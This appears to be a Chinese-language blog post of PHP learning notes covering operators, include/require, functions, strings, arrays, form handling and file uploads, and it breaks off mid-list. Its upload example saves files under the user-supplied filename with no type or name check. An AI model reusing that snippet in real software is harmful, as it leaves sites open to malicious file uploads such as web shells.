class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Decbin()：十进制转二进制</span><br><span class="line"></span><br><span class="line">Decoct()：十进制转八进制</span><br><span class="line"></span><br><span class="line">Dechex()：十进制转十六进制</span><br><span class="line"></span><br><span class="line">Bindec()：二进制转十进制</span><br></pre></td></tr></table></figure><p><strong>比较运算符</strong></p><p>比较运算：比较两个数据的大小，或者两个内容是否相同，返回的结果都是布尔类型：满足返回true，不满足返回false</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;：左边大于右边，返回结果true</span><br><span class="line">&gt;=：左边大于等于右边</span><br><span class="line">&lt;：左边小于右边</span><br><span class="line">&lt;=：左边小于或者等于右边</span><br><span class="line">==：左边的与右边的相同（大小相同）</span><br><span class="line">!=：左边的与右边的不同（大小不同）</span><br><span class="line">===：全等于，左边与右边相同：大小以及数据的类型都要相同</span><br><span class="line">!==：不全等于，只有大小或者类型不同</span><br></pre></td></tr></table></figure><p><strong>逻辑运算符</strong></p><p>逻辑运算：针对不同的结果进行匹配。满足条件返回true，不满足返回false</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;：逻辑与，左边的条件与右边的条件同时成立（两边结果都为true）</span><br><span class="line"></span><br><span class="line">||：逻辑或，左边的条件或者右边的条件只要有一个满足即可</span><br><span class="line"></span><br><span class="line">！：逻辑非，对已有条件进行取反，本身为true，取反结果就是false</span><br></pre></td></tr></table></figure><blockquote><p>逻辑与和逻辑或又称之为短路运算：如果第一个表达式结果已经满足条件了，那么就不会运行逻辑运算符后面的表达式：在书写代码的时候，尽量将出现概率最高的（能够直接判断出结果）的表达式放到第一位</p></blockquote><p><strong>连接运算符</strong></p><p>连接运算：是PHP中将多个字符串拼接的一种符号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">. ：将两个字符串连接到一起</span><br><span class="line">.= ： 复合运算，将左边的内容与右边的内容连接起来，然后重新赋值给左边变量</span><br><span class="line">A .= b ===== A = A . b</span><br></pre></td></tr></table></figure><p><strong>错误抑制符</strong></p><p>在PHP中有一些错误可以提前预知，但是这些错误可能无法避免，但是又比希望报错给用户看，可以使用错误抑制符处理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@：在可能出错的表达式前面使用@符号即可</span><br></pre></td></tr></table></figure><p><strong>三目</strong></p><p>有三个表达式参与的运算（分支结构）（可进行复合）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">表达式1 ? 表达式2 : 表达式3</span><br></pre></td></tr></table></figure><p>表达式1成立。执行表达式2，否则执行表达式3</p><h6 id="自操作运算符"><a href="#自操作运算符" class="headerlink" title="自操作运算符"></a>自操作运算符</h6><p>自操作：自己操作自己的运算符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">++：在原来的值上+1</span><br><span class="line">--：在原来的值上-1</span><br><span class="line">$a = 1;</span><br><span class="line">$a++; // $a = $a + 1;</span><br></pre></td></tr></table></figure><p>在PHP中自操作符是可以放到变量前或者后：前置自操作和后置自操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = 1;</span><br><span class="line">$a++;</span><br><span class="line">++$a;    //前置或者后置如果本身只有自操作，不参与其他运算（自操作同时），那么效果是一样的。但是如果自操作同时还参与别的运算，那么效果就不一样</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = 1;</span><br><span class="line">$b = $a++;//$a++会导致$a = $a + 1; $a = 2;，上面的$b = 1</span><br><span class="line">$c =++$a;//++$a会导致$a = $a + 1; $a = 2;，$c = 2;</span><br></pre></td></tr></table></figure><p>后置自操作：先把自己所保存的值留下来，然后改变自己，自己给别人的值是原来的值；<br>前置自操作：先把自己改变，然后把改变后的值给别人。</p><p><strong>位运算符</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp;: 按位与，两个都为1，结果为1</span><br><span class="line">|: 按位或，两个有一个为1，结果为1</span><br><span class="line">~ ： 按位非，如果为1则变为0</span><br><span class="line">^： 按位异或，两个相同为0，不同为1</span><br><span class="line">&lt;&lt;： 按位左移，向左移动一位，后边补0</span><br><span class="line">&gt;&gt;： 按位右移，类似于左移，补为对应内容，正数补0，负数补1</span><br></pre></td></tr></table></figure><h5 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h5><p>文件包含：在一个PHP脚本中，去将另外一个文件（PHP）包含进来，去合作完成一件事情。</p><p>文件包含的意义：</p><p>1、 要么使用被包含文件中的内容，实现代码的共享（重用）：向上包含（索要）</p><p>向上包含：在当前脚本要用某个代码之前包含别的文件</p><p>2、 要么自己有东西可以给别的文件使用，实现代码的共享（重用）：向下包含（给予）</p><p>向下包含：在自己有某个东西的时候，需要别的脚本来显示（自己代码写完之后包含其他文件）</p><p>最大的作用：分工协作，每个脚本做的事情不一样，因此可以使用协作方式，让多个脚本共同完成一件事情。</p><p>文件包含四种形式</p><p>在PHP中文件的包含有四种形式（两种大形式）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Include：包含文件 Include系统会碰到一次，执行一次；如果对统一个文件进行多次加载，那么系统会执行多次；</span><br><span class="line">Include_once：系统会自动判断文件包含过程中，是否已经包含过（一个文件最多被包含一次）系统碰到多次，也只会执行一次。</span><br><span class="line">Require：与include相同</span><br><span class="line">Require_once：以include_once相同</span><br></pre></td></tr></table></figure><p><code>Include</code>的错误级别比较轻：不会阻止代码执行</p><p><code>Require</code>要求较高：如果包含出错代码不再执行（require后面的代码）</p><p>包含基本语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Include ‘文件名字’;</span><br><span class="line"></span><br><span class="line">Include(‘文件名字’);    //文件名字：路径问题</span><br></pre></td></tr></table></figure><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824182806590.png" alt="image-20210824182806590"></p><p>以上方式：是先包含文件，后使用文件中的内容（向上包含）</p><p>向下包含：先准备内容，然后包含另外的文件，在另外的文件中，使用当前的内容</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824183244631.png" alt="image-20210824183244631"></p><h6 id="PHP代码的执行流程"><a href="#PHP代码的执行流程" class="headerlink" title="PHP代码的执行流程"></a>PHP代码的执行流程</h6><blockquote><p>1、 读取代码文件（PHP程序）</p><p>2、 编译：将PHP代码转换成字节码（生成opcode）</p><p>3、zendengine来解析opcode，按照字节码去进行逻辑运算</p><p>4、 转换成对应的HTML代码</p></blockquote><h6 id="加载原理"><a href="#加载原理" class="headerlink" title="加载原理"></a>加载原理</h6><blockquote><p>1、 在文件加载（include或者require）时，系统会自动的将被包含文件中的代码相当于嵌入到当前文件中</p><p>2、 加载位置：在哪加载，对应的文件中的代码嵌入的位置就是对应的include位置</p><p>3、 在PHP中被包含的文件是单独进行编译的 </p></blockquote><p>PHP文件在编译的过程中如果出现了语法错误，那么会失败（不会执行）；但是如果被包含文件有错误的时候，系统会在执行到包含include这条语句的时候才会报错。</p><h6 id="文件加载路径"><a href="#文件加载路径" class="headerlink" title="文件加载路径"></a>文件加载路径</h6><p>文件加载路径<br>绝对路径：<code>例如：c:/windows/a.php（推荐使用）</code><br>相对路径：<code> 例如 ./a.php</code><br><code>   . ：代表的是当前文件所在位置</code><br><code>   ./：代表的是当前执行的脚本文件所在位置</code><br><code>   ../:代表上级目录</code></p><p><strong>文件嵌套包含</strong></p><p>文件嵌套包含：一个文件包含另外一个文件，同时被包含的文件又包含了另外一个文件。</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824183732882.png" alt="image-20210824183732882"> </p><p>嵌套包含的时候就很容易出现相对路径出错的问题：相对路径会因为文件的包含而改变（./和../）：windows下面，每一个文件夹下都有.和..的文件夹。</p><h1 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h1><p>2021-8-25</p><h5 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h5><p><strong>基本语法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function 函数名([参数])&#123;</span><br><span class="line">//函数体</span><br><span class="line">//返回值：return 结果;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>参数（形参和实参）</strong></p><p>形参：形式参数，不具有实际意义的参数，是在函数定义时使用的参数</p><p>实参：实际参数，具有实际数据意义的参数，是在函数调用时使用的参数</p><p>形参是实参的载体：实参在调用时通常是需要传入到函数内部参与计算（运算），那么需要在函数内部去找到实际数据所在的位置才能找到数据本身：需要实际调用的时候，将数据以实参的形式传递给形参：给形参赋值，从而使得函数内部可以用到外部数据。</p><p><strong>默认值</strong>：在形参处给形参定义默认值。默认值放在参数的最右侧</p><p>参数的传递方式：值传递和引用传递</p><p>函数体：函数体里可以定义变量，常量，函数，分支语句，循环语句，调用其他函数</p><p>函数返回值：return：返回函数的运行结果，同时也终止return后续代码的执行</p><p>作用域：局部（函数体内），全局（函数体外），超全局（函数体内和函数体外）</p><p>静态变量语法：static 变量名=值;作用是为了跨函数共享数据（同一个函数被多次调用</p><p>可变函数：用一个变量报错函数名，调用时用该变量+括号，就能调用对应的函数</p><p>匿名函数语法：变量名=function(){函数体};    变量保存匿名函数，本质得到的是一个对象</p><p>闭包：函数内部有一些局部变量（要执行的代码块）在函数执行之后没有被释放，是因为在函数内部还有对应的函数在引用（函数的内部函数：匿名函数）</p><h5 id="伪类型"><a href="#伪类型" class="headerlink" title="伪类型"></a>伪类型</h5><p>mixed：混合类型包括八小类型<br>number：数值类型包括：整数类型和浮点型</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825153013850.png" alt="image-20210825153013850"></p><h5 id="常用系统函数"><a href="#常用系统函数" class="headerlink" title="常用系统函数"></a>常用系统函数</h5><p>系统常用的函数<br>输出函数：<code>print_r(),var_dump()</code><br>时间函数：<code>date(),time(),microtime(),strtotime()</code><br>数学函数：<code>max(),min(),rand(),mt_rand(),round(),ceil(),floor(),pow(),abs(),sqrt()</code><br>有关函数的函数:function_exists()：判断指定的函数名字是否在内存中存在（帮助用户不去使用一个不存在的函数，让代码安全性更高）</p><p>func_get_arg()：在自定义函数中去获取指定数值对应的参数</p><p>func_get_args()：在自定义函数中获取所有的参数（数组）</p><p>func_num_args()：获取当前自定义函数的参数数量   设置php.ini的配置文件信息：<code>ini_set(&#39;配置项&#39;,配置值)</code></p><h5 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h5><p> PHP单引号，和双引号能识别的转义符：单引号中能够识别\’，而双引号中就不能识别\’</p><p><strong>字符串函数</strong><br>  strlen(),mb_strlen()</p><p>1）转换函数：implode(), explode(), str_split()</p><p>Implode(连接方式,数组)：将数组中的元素按照某个规则连接成一个字符串</p><p>Explode(分割字符,目标字符串)：将字符串按照某个格式进行分割，变成数组</p><p>中国|北京|顺义 == array(‘中国’,‘北京’,’顺义’);</p><p>Str_split(字符串,字符长度)：按照指定长度拆分字符串得到数组</p><p>2）截取函数：trim(), ltrim(), rtrim()</p><p>Trim(字符串[,指定字符])：本身默认是用来去除字符串两边的空格（中间不行），但是也可以指定要去除的内容，是按照指定的内容循环去除两边有的内容：直到碰到一个不是目标字符为止</p><p>Ltrim()：去除左边的</p><p>Rtrim()：去除右边的</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825160239038.png" alt="image-20210825160239038"></p><p>3）截取函数：substr(), strstr()</p><p>Substr(字符串,起始位置从0开始[,长度])：指定位置开始截取字符串，可以截取指定长度（不指定到最后）</p><p>Strstr(字符串,匹配字符)：从指定位置开始，截取到最后（可以用来去文件后缀名）</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825160752887.png" alt="image-20210825160752887"></p><p>4）大小转换函数：strtolower(), strtoupper(), ucfirst()</p><p>Strtolower：全部小写</p><p>Strtoupper：全部大写</p><p>Ucfirst：首字母大写</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825161752785.png" alt="image-20210825161752785"></p><p>5）查找函数：strpos(), strrpos()</p><p>Strpos(字符串，匹配字符)：判断字符在目标字符串中出现的位置（首次）</p><p>Strrpos(字符串，匹配字符)：判断字符在目标字符串中最后出现的位置</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825162203027.png" alt="image-20210825162203027"></p><p>6）替换函数：str_replace()</p><p>Str_replace(匹配目标,替换的内容,字符串本身)：将目标字符串中部分字符串进行替换</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825162322612.png" alt="image-20210825162322612"></p><p>7）格式化函数：printf(), sprintf()</p><p>Printf/sprintf(输出字符串有占位符,顺序占位内容..)：格式化输出数据</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825162541714.png" alt="image-20210825162541714"></p><p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image012-1629878037632.jpg" alt="img"></p><p>8）其他：str_repeat(), str_shuffle()</p><p>Str_repeat()：重复某个字符串N次</p><p>Str_shuffle()：随机打乱字符串</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825162659626.png" alt="image-20210825162659626"></p><p>结构化定义字符串变量的规则：</p><blockquote><p>1、 结构化定义字符串对应的边界符有条件：</p><p>1.1  上边界符后面不能跟任何内容；</p><p>1.2  下边界符必须顶格：最左边；</p><p>1.3  下边界同样后面只能跟分号，不能跟任何内容；</p><p>2、 结构化定义字符串的内部（边界符之间）的所有内容都是字符串本身</p></blockquote><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825165125751.png" alt="image-20210825165125751"></p><p><strong>字符串转义</strong></p><p>转义的含义：在计算机通用协议中，有一些特定的方式定义的字母，系统会特定处理：通常这种方式都是使用反斜杠+字母（单词）的特性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">\r\n：回车换行</span><br><span class="line">PHP在识别转义字符的时候也是使用同样的模式：反斜杠+字母</span><br><span class="line">在PHP中系统常用的转义符号：</span><br><span class="line">\’：在单引号字符串中显示单引号</span><br><span class="line">\”：在双引号字符串中显示双引号</span><br><span class="line">\r：代表回车（理论上是回到当前行的首位置）</span><br><span class="line">\n：代表新一行</span><br><span class="line">\t：类似tab键，输出4个空格</span><br><span class="line">\$：在PHP中使用$符号作为变量符号，因此需要特定识别</span><br><span class="line">1、其中单引号中能够识别\’，而双引号中就不能识别\’</span><br><span class="line">2、双引号中因为能够识别$符号，所以双引号中可以解析变量，而单引号不可以</span><br></pre></td></tr></table></figure><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210825164718090.png" alt="image-20210825164718090"></p><h1 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h1><h5 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h5><p>   第一数组的三种方式：<code>$arr=array(1,2,3); $arr=[1,2,3]; $arr[]=1,$arr[]=2</code><br>   数组根据下标可分为：索引数组，关联数组，混合数组</p><p><strong>foreach循环</strong><br>   语法形式:foreach(数组变量 as [$key]=&gt;$value){循环体}</p><p>each函数的作用，list结构的使用</p><p>相关函数</p><p>1）排序函数：对数组元素进行排序，都是按照ASCII码进行比较，可以进行英文比较</p><p>sort()：顺序排序（下标重排）</p><p>rsort()：逆序排序</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826163701953.png" alt="image-20210826163701953"></p><p>asort()：顺序排序（下标保留）</p><p>arsort()：逆序排序</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826163746221.png" alt="image-20210826163746221"></p><p>ksort()：顺序排序：按照键名（下标）</p><p>krsort()：逆序排序</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826163835461.png" alt="image-20210826163835461"></p><p>shuffle()：随机打乱数组元素，数组下标会重排</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826163937743.png" alt="image-20210826163937743"></p><p>2）指针函数</p><p>reset()：重置指针，将数组指针回到首位</p><p>end()：重置指针，将数组指针指导最后一个元素</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826164154611.png" alt="image-20210826164154611"></p><p>next()：指针下移，取得下一个元素的值</p><p>prev()：指针上移，取得上一个元素的值</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826164245168.png" alt="image-20210826164245168"></p><p>current()：获取当前指针对应的元素值</p><p>key()：获取当前指针对应的下标值</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826164343904.png" alt="image-20210826164343904"></p><p>注意事项：next和prev会移动指针，有可能导致指针移动到最前或者最后（离开数组），导致数组不能使用，通过next和prev不能回到真确的指针位置。只能通过end或者reset进行指针重置</p><p>3）其他函数</p><p>count()：统计数组中元素的数量</p><p>array_push()：往数组中加入一个元素（数组后面）</p><p>array_pop()：从数组中取出一个元素（数组后面）</p><p>array_shift()：从数组中取出一个元素（数组前面）</p><p>array_unshift()：从数组中加入一个元素（数组前面）</p><p>PHP模拟数据结构：</p><p>栈：压栈，先进去后出来（FILO）</p><p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image016-1629966823737.jpg" alt="img"></p><p>队列：排队，先进去的先出去（FIFO）</p><p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image018-1629966823737.jpg" alt="img"></p><p>array_reverse()：数组元素反过来</p><p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image020-1629966823737.jpg" alt="img"></p><p>in_array()：判断一个元素在数组中是否存在</p><p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image022.jpg" alt="img"></p><p>array_keys()：获取一个数组的所有下标，返回一个索引数组</p><p>array_values()：获取一个数组的所有值，返回一个索引数组</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826165005282.png" alt="image-20210826165005282"></p><h5 id="表单传值"><a href="#表单传值" class="headerlink" title="表单传值"></a>表单传值</h5><p>概念</p><p>表单传值即浏览器通过表单元素将用户的选择或者输入的数据提交给后台服务器语言。</p><p>为什么使用表单传值</p><p>动态网站（Web2.0）的特点就是后台根据用户的需求定制数据，所谓的“需求”就是用户通过当前的选择或者输入的数据信息，表单就是这些数据的承载者。</p><p>表单传值方式</p><p><strong>GET传值</strong></p><p>1）form表单</p><p><code>&lt;form method=&quot;GET&quot;&gt;表单元素&lt;/form&gt;</code></p><p>2）a标签</p><p><code>&lt;a href=”www.itcast.cn/index.php?学科=PHP”&gt;</code></p><p>3）location对象的href属性</p><p><code>&lt;script&gt;location.href=”www.itcast.cn/index.php?data=PHP”&lt;/script&gt;</code></p><p>4）location对象的assign()方法</p><p><code>&lt;script&gt;location.assign(“www.itcast.cn/index.php?data=PHP”)&lt;/script&gt;</code></p><p><strong>POST传值</strong></p><p>1）post表单方式的基本设定</p><p><code>&lt;form method=&quot;POST&quot;&gt;表单元素&lt;/form&gt;</code></p><p>2）post方式跟get方式的区别</p><p>1、 Get传输的数据主要用来获取数据，不改变服务器上资源：get只是用来获取内容</p><p>2、 Post传输的数据主要用来增加数据，改变服务器上资源：POST会改变服务器上数据内容</p><p>3、 传输方式上post必须使用form表单，而get可以使用form表单和URL</p><p>4、 get传输数据可以在URL中对外可见，而post不可见：GET传值最终会在浏览器的地址栏中全部显示：?数据名=数据值&amp;数据名2=数据值2…</p><p>5、 get和post能传输的数据大小不同，get为2K，post理论无限制（事实上，GET和POST本身没有数据长度限制，但是浏览器厂家做了一些限制）</p><p>6、 get和post能够传输的数据格式有区别：get传输简单数据（数值/字符串），post可以提交复杂数据（二进制等）</p><p><strong>PHP接收数据的三种方式</strong></p><p>不管是$_GET/$_POST/$_REQUEST，三个都是PHP超全局（没有范围限制）预定义数组，表单元素的“name”属性的值作为数组的下标，而value属性对应的值就是数组的元素值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_GET方式：接收GET方式提交的数据</span><br><span class="line">$_POST方式：接收POST方式提交的数据</span><br><span class="line">$_REQUEST方式：接收POST或者GET提交的所有数据</span><br><span class="line">1）$_REQUEST所存储数据的内容：将$_POST和$_GET合并存储到一个数组</span><br><span class="line">2）$_REQUEST和$_POST与$_GET的联系：如果GET和POST中有同名数组元素（下标），POST会覆盖GET（PHP中数组元素下标具有唯一性），这个可以在php.ini中进行配置</span><br></pre></td></tr></table></figure><p>GET/POST/REQUEST关系</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826170108563.png" alt="image-20210826170108563"></p><p>证明在REQUEST中POST会覆盖GET</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826183108358.png" alt="image-20210826183108358"></p><p>reques保留username是属于post提交   POST覆盖了GET</p><p><strong>PHP处理复选框数据</strong></p><p><strong>复选框表单项的命名方式</strong></p><p>复选框：通常是将一类内容以同样（同名）的形式传递给后台，数据库存储通常是一个字段存储。复选框的特点：选中才会提交</p><p>1、 在浏览器端，checkbox的name属性的值不论什么都会被浏览器毫无保留的提交</p><p>2、 在PHP中$_POST/$_GET都会对同名name属性进行覆盖</p><p>解决方案：浏览器不识别[]（浏览器不认为有特殊性），但是PHP认为[]有特殊性：系统自动认为该符号是数组的形式，所以PHP就会自动的将同名的但是带有[]的元素组合到一起形成一个数组</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826183141816.png" alt="image-20210826183141816"></p><p><strong>复选框数据的接收形式</strong></p><p>PHP会自动组合同名元素的为数组</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826183216058.png" alt="image-20210826183216058"></p><p><strong>复选框数据的常见处理</strong></p><p>1）单选按钮的数据处理</p><p>Radio button：可以出现多个选择项，但是只能选择其中一个</p><p>1、 表单中使用的name属性，使用同名即可：只能选中一个</p><p>2、 后台接收数据也不需要额外处理</p><p>3、 数据库存储的话只需要一个字段存储普通数据即可（数字或者字符串）</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826183545924.png" alt="image-20210826183545924"></p><p>4、 PHP拿到数据之后，组织SQL直接存储到数据表即可</p><p>2）多选按钮的数据处理</p><p>1、 表单中name属性使用数组格式：名字[]（一类复选框数据使用一个）</p><p>2、 后台接收到数据之后，是一个数组（数组不能存储到数据库）</p><p>3、 PHP需要将数组转换成指定格式的字符串：使用分隔符分隔每一个元素并且形成字符串：implode(’分隔符’ ,数组)</p><p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image012-1629968091622.jpg" alt="img"></p><p>4、 PHP组织SQL直接存储到数据库</p><p>取出来复选框数据显示</p><p>1、 如果是反过来操作，那么取出数据之后使用explode把字符串变成数组</p><p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image014-1629968091622.jpg" alt="img"></p><p>2、 在HTML显示当中，通过判断复选框元素是否在数组中存在，来确定复选框checkbox是否有checked=“checked”属性：in_array()</p><p>3）其他常规同名表单项的数据处理</p><p>除开radio button单选框和checkbox复选框，很少会出现同名的表单项。如果非要使用同名的来进行管理，那么可以采用checkbox方式进行操作</p><p>1、 表单中同名增加[]</p><p>2、 PHP接收时数组处理</p><p>3、 PHP转换成有格式的字符串</p><p>4、 数据库字符串存储</p><p><strong>复选框细节</strong></p><p>如果复选框没有选中，那么浏览器就不会提交。因此在PHP接收使用复选框（单选框）数据的时候，应该先判断是否存在该数据</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826185428003.png" alt="image-20210826185428003"></p><h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><p>原理</p><p>文件上传：文件从用户本地电脑通过传输方式（Web表单）保存到服务器所在电脑指定的目录下。</p><p>1、 增加文件上传的表单：浏览器请求一个服务器的HTML脚本（包含文件上传表单）</p><p>2、 用户从本地选择一个文件（点击上传框（按钮））</p><p>3、 用户点击上传：文件会通过物联网传输到服务器上</p><p>4、 服务器操作系统会将文件保存到临时目录：是以临时文件格式保存（windows下tmp）</p><p>5、 服务器脚本开始工作：判断文件有效</p><p>6、 服务器脚本将有效文件从临时目录移动到指定的目录下（完成）</p><p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image018-1629968091622.jpg" alt="img"></p><p>表单写法</p><p>1）method属性：表单提交方式必须为POST</p><p>2）enctype属性：form表单属性，主要是规范表单数据的编码方式</p><p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image020-1629968091622.jpg" alt="img"></p><p>3）上传表单：file表单</p><p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image022-1629968091622.jpg" alt="img"></p><p>在PHP中，有一个预定义变量$_FILES是专门用来存储用户上传的文件的。</p><p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image024-1629968091622.jpg" alt="img"></p><p>测试：如果没有enctype属性，那么上传文件会是什么样子？</p><p>$_FILES变量详解</p><p>1）name：文件在用户（浏览器端）电脑上实际存在的名字（实际用来保留后缀）</p><p>2）tmp_name：文件上传到服务器后操作系统保存的临时路径（实际用来给PHP后期使用）</p><p>3）type：MIME（多功能互联网邮件扩展）类型，用来在计算机中客户端识别文件类型（确定软件）</p><p>4）error：文件上传的代号，用来告知应用软件（PHP）文件接收过程中出现了什么问题（PHP后期根据代码进行文件判断）</p><p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image026.jpg" alt="img"></p><p>5）size：文件大小（PHP根据实际需求来确定是否该保留）</p><p>移动临时文件到目标位置</p><p>文件上传之后会保存到$_FILES中，那么访问文件信息的形式就是$_FILES[‘表单name属性值’][‘元素信息’]</p><p>1）判断是否为上传的文件：is_uploaded_file()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//1、取得文件信息</span><br><span class="line">$file = $_FILES[&#x27;image&#x27;];</span><br><span class="line">//2、判断是否是上传文件：临时文件</span><br><span class="line">if(is_uploaded_file($file[&#x27;tmp_name&#x27;]))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2）移动文件：move_uploaded_file()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//2、判断是否是上传文件：临时文件</span><br><span class="line">if(is_uploaded_file($file[&#x27;tmp_name&#x27;]))&#123;</span><br><span class="line">//是上传文件</span><br><span class="line">if(move_uploaded_file($file[&#x27;tmp_name&#x27;],&#x27;uploads/&#x27; . $file[&#x27;name&#x27;]))&#123;</span><br><span class="line">echo &#x27;文件保存成功！&#x27;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &#x27;文件保存失败！&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多文件上传</p><p>当商品需要上传多个图片进行展示的时候：那么需要使用多文件上传</p><p>​    针对一个内容但是不同文件说明：同名表单</p><p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image032.jpg" alt="img"> </p><p>当商品需要进行多个维度图片说明的时候：需要使用多文件上传</p><p>​    针对是不同内容所以表单名字不一样：批量解决问题</p><p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image034.jpg" alt="img"></p><p>多文件上传的$_FILES变量的数据结构形式</p><p>批量上传：同名表单：将表单名字形成一个数组，而且同时将文件对应的五个要素：name</p><p>Tmp_name、size、type、error都形成对应数量的数组，每个文件上传对应数组元素的下标都是一样的：name[0] 和type[0]是属于同一个文件</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210826185545292.png" alt="image-20210826185545292"></p><p>1、 不同名多文件上传处理方式：按照表单名字从$_FILES中取出来就可以直接使用（明确知道表单中有多少个文件上传）；如果不确定表单中有多少个文件上传，不适合挨个去取（效率不高），可以通过遍历$_FILES数组，挨个取出来实现文件上传</p><p><img src="E:/sECRET/hexo/blog/source/_posts/clip_image043.jpg" alt="img"></p><p>2、 